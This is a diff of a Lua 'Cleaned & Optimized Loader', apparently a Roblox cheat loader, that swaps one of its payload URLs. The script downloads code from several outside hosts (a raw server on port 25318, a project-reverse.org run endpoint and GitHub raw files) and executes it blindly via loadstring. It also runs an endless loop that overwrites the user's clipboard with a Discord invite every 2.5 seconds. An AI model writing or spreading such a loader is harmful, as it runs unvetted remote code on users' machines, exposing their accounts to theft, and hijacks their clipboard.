@@ -1,54 +1,54 @@
--- Cleaned & Optimized Loader
-
-local function loadScript(url)
-    loadstring(game:HttpGet(url))()
-    end
-
-    local function copyDiscord()
-        task.spawn(function()
-                task.wait(0.5)
-                        setclipboard("https://discord.gg/GmT3uvzhVH")
-                                pcall(function()
-                                            WindUI:Notify({
-                                                            Title = "Discord Copied!",
-                                                                            Content = "Link copied to clipboard.",
-                                                                                            Icon = "message-circle",
-                                                                                                            Duration = 4
-                                                                                                                        })
-                                                                                                                                end)
-                                                                                                                                    end)
-                                                                                                                                    end
-
-                                                                                                                                    local function discordSpammer()
-                                                                                                                                        task.spawn(function()
-                                                                                                                                                while true do
-                                                                                                                                                            setclipboard("https://discord.gg/GmT3uvzhVH")
-                                                                                                                                                                        
-                                                                                                                                                                                    pcall(function()
-                                                                                                                                                                                                    WindUI:Notify({
-                                                                                                                                                                                                                        Title = "Discord Copied!",
-                                                                                                                                                                                                                                            Content = "Join our community! (Auto Repeating)",
-                                                                                                                                                                                                                                                                Icon = "message-circle",
-                                                                                                                                                                                                                                                                                    Duration = 2.5
-                                                                                                                                                                                                                                                                                                    })
-                                                                                                                                                                                                                                                                                                                end)
-                                                                                                                                                                                                                                                                                                                            
-                                                                                                                                                                                                                                                                                                                                        task.wait(2.5)
-                                                                                                                                                                                                                                                                                                                                                end
-                                                                                                                                                                                                                                                                                                                                                    end)
-                                                                                                                                                                                                                                                                                                                                                    end
-
-                                                                                                                                                                                                                                                                                                                                                    -- ====================== EXECUTION ======================
-
-                                                                                                                                                                                                                                                                                                                                                    task.spawn(function() loadScript("http://d20.aurorix.net:25318/awuG2PpCeisd3qoL7tpoEzFoftIYSFuyWyoljxE9Zrg1Z4gQnef6zfsHhlHc6wYPaU1jR4pQgpIZAP67") end) -- s1
-
-                                                                                                                                                                                                                                                                                                                                                    task.spawn(function() loadScript("https://api.project-reverse.org/run/eyJpZCI6IjAyYTRkZGNhLWYyNmMtNGNmZC04MWM0LTk4MDNiOGI1M2VmNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2NyaXB0LTkyMDkvcm9ibG94L3JlZnMvaGVhZHMvbWFpbi9tbTIta2V5bGVzcy1hdXRvIn19") end) -- s3
-
-                                                                                                                                                                                                                                                                                                                                                    task.spawn(function() loadScript("https://raw.githubusercontent.com/bvfjaj/vx-n/refs/heads/main/324281") end) -- s4
-
-                                                                                                                                                                                                                                                                                                                                                    -- Discord functions
-                                                                                                                                                                                                                                                                                                                                                    copyDiscord()      -- Normal copy (s2 + s5)
-                                                                                                                                                                                                                                                                                                                                                    discordSpammer()   -- Aggressive repeating spam (s6)
-
-                                                                                                                                                                                                                                                                                                                                                    -- Optional: Small delay between main scripts
-                                                                                                                                                                                                                                                                                                                                                    task.wait(0.3)
+-- Cleaned & Optimized Loader  
+  
+local function loadScript(url)  
+    loadstring(game:HttpGet(url))()  
+    end  
+  
+    local function copyDiscord()  
+        task.spawn(function()  
+                task.wait(0.5)  
+                        setclipboard("https://discord.gg/GmT3uvzhVH")  
+                                pcall(function()  
+                                            WindUI:Notify({  
+                                                            Title = "Discord Copied!",  
+                                                                            Content = "Link copied to clipboard.",  
+                                                                                            Icon = "message-circle",  
+                                                                                                            Duration = 4  
+                                                                                                                        })  
+                                                                                                                                end)  
+                                                                                                                                    end)  
+                                                                                                                                    end  
+  
+                                                                                                                                    local function discordSpammer()  
+                                                                                                                                        task.spawn(function()  
+                                                                                                                                                while true do  
+                                                                                                                                                            setclipboard("https://discord.gg/GmT3uvzhVH")  
+                                                                                                                                                                          
+                                                                                                                                                                                    pcall(function()  
+                                                                                                                                                                                                    WindUI:Notify({  
+                                                                                                                                                                                                                        Title = "Discord Copied!",  
+                                                                                                                                                                                                                                            Content = "Join our community! (Auto Repeating)",  
+                                                                                                                                                                                                                                                                Icon = "message-circle",  
+                                                                                                                                                                                                                                                                                    Duration = 2.5  
+                                                                                                                                                                                                                                                                                                    })  
+                                                                                                                                                                                                                                                                                                                end)  
+                                                                                                                                                                                                                                                                                                                              
+                                                                                                                                                                                                                                                                                                                                        task.wait(2.5)  
+                                                                                                                                                                                                                                                                                                                                                end  
+                                                                                                                                                                                                                                                                                                                                                    end)  
+                                                                                                                                                                                                                                                                                                                                                    end  
+  
+                                                                                                                                                                                                                                                                                                                                                    -- ====================== EXECUTION ======================  
+  
+                                                                                                                                                                                                                                                                                                                                                    task.spawn(function() loadScript("https://raw.githubusercontent.com/script-9209/roblox/refs/heads/main/mm2-keyless-auto") end) -- s1  
+  
+                                                                                                                                                                                                                                                                                                                                                    task.spawn(function() loadScript("https://api.project-reverse.org/run/eyJpZCI6IjAyYTRkZGNhLWYyNmMtNGNmZC04MWM0LTk4MDNiOGI1M2VmNCIsImtpbmQiOiJsb2FkZXIifQ") end) -- s3  
+  
+                                                                                                                                                                                                                                                                                                                                                    task.spawn(function() loadScript("https://raw.githubusercontent.com/bvfjaj/vx-n/refs/heads/main/324281") end) -- s4  
+  
+                                                                                                                                                                                                                                                                                                                                                    -- Discord functions  
+                                                                                                                                                                                                                                                                                                                                                    copyDiscord()      -- Normal copy (s2 + s5)  
+                                                                                                                                                                                                                                                                                                                                                    discordSpammer()   -- Aggressive repeating spam (s6)  
+  
+                                                                                                                                                                                                                                                                                                                                                    -- Optional: Small delay between main scripts  
+                                                                                                                                                                                                                                                                                                                                                    task.wait(0.0)  
